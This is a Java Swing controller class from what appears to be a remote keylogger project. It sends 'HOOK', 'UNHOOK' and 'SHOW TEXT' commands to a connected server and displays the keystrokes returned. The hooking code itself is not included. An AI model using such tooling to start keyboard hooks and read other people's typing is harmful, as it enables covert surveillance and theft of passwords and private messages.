package controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

import javax.swing.*;

import model.Client;

import view.features.*;

public class KeylogListener implements ActionListener{
	
	private KeylogDesign keylogDesign;
	
	public KeylogListener(KeylogDesign keylogDesign)
	{
		this.keylogDesign = keylogDesign;
	}
	
	@Override
	public void actionPerformed(ActionEvent e) {
		if(Client.client == null) {
			JOptionPane.showMessageDialog(null, "Not connected to the server");
			return;
		}
		
		String click = e.getActionCommand();
		
		boolean isHook = false;
		
		if ("HOOK".equals(click))
		{
			try {
				Client.out.write(click);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				e2.printStackTrace();
			}	
			//JOptionPane.showMessageDialog(null, "Start Hook");	
		}
		
		else if ("UNHOOK".equals(click))
		{

			try {
				Client.out.write(click);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				e2.printStackTrace();
			}
				
			//JOptionPane.showMessageDialog(null, "Start UnHook");
		}
		else if ("SHOW TEXT".equals(click))
		{
			try {
				Client.out.write(click);
				Client.out.newLine();
				Client.out.flush();
			} catch (IOException e2) {
				e2.printStackTrace();
			}
			
				String outString = "";
		        try {
					outString = Client.in.readLine();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
		        outString = outString.trim();
		        
		        this.keylogDesign.txtKeylog.append(outString); 
		        
		        
		}
		else if ("CLEAR TEXT".equals(click))
		{
//			
			this.keylogDesign.txtKeylog.setText("");
//			
		}
		
	}
	
	
}
